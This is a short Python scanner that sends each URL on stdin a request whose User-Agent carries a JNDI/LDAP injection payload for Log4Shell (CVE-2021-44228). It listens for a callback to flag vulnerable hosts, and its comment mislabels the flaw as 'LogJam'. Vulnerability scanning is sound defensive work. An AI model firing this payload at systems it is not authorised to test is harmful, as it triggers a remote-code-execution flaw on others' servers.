#!/usr/bin/env python3

# Take URLs (starting http:// or https://) on std in, send an HTTP request to each URL in turn
# containing a payload in the User-Agent header which will cause a call back to a listening 
# socket. If a call back is received the system is vulnerable to CVE-2021-44228 (LogJam/Log4Shell)

import sys
import requests
import socket
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Public call back is required:
CALL_BACK_IP = '10.0.0.1'
CALL_BACK_PORT = '80'

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def sendRequest(url):
    try:
        requests.get(url, timeout=5, verify = False, headers={'User-Agent':'${jndi:ldap://' + CALL_BACK_IP + ':' + CALL_BACK_PORT + '}/a}'})
    except requests.Timeout:
        pass

for line in sys.stdin:
    line = line.rstrip()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', int(CALL_BACK_PORT)))
    sock.settimeout(5)
    sock.listen(1)
    threading.Thread(target=sendRequest, args=(line,)).start()
    try:
        _, ip = sock.accept()
        print(f'[*] Vulnerable system identified - {line} [*]')
    except socket.timeout:
        pass
    sock.close()
